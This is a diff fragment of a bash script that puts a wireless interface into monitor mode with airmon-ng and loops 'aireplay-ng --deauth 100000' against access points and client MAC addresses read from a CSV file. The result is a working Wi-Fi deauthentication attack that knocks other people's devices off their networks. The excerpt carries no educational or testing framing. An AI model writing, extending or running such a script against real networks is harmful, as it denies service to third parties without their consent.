@@ -1,9 +1,7 @@
 #!/bin/bash
 echo 'Your network interface name?'
 read interface
-# # airmon-ng start $interface
-# # airodump-ng $interface
-
+airmon-ng start $interface
 ud="users-01.csv"
 
 if [ -e "$ud" ]; then
@@ -61,5 +59,5 @@ while true; do
             iwconfig wlan0 channel 6 && \
             sudo aireplay-ng --deauth 100000 -a "$bssid" -c "$mac" "$interface" &
     done
-    sleep 5  # Adjust the sleep duration based on your requirements
+    sleep 5 
 done
